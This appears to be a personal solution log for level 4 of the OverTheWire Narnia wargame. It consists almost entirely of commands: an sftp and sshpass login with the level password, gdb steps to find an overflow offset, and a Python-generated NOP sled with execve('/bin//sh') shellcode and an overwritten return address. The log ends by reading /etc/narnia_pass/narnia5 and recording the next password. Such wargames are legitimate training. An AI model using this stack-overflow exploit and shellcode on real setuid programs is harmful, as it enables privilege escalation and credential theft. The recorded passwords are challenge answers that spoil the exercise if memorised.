sftp -oPort=2226 narnia4@narnia.labs.overthewire.org
iqNWNk173q
get /narnia/narnia4
get /narnia/narnia4.c
exit

sshpass -p 'iqNWNk173q' ssh narnia4@narnia.labs.overthewire.org -p 2226
cd /narnia

gdb-gef narnia4
disassemble main
# set breakpoint at strcpy
# b *0x********
run $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*268)")
# address of argv[1] 0xffffd4c0 -> \xc0\xd4\xff\xff
# n <- next step
# ebp and edi gonna be "AAAA"
run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*230+b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'+b'\xc0\xd4\xff\xff')")
quit

# after quit gdb, u have to shift the address of buffer by 30? to get the shellcode working
./narnia4 $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*230+b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'+b'\xf0\xd4\xff\xff')")
cat /etc/narnia_pass/narnia5
# Password: Ni3xHPEuuw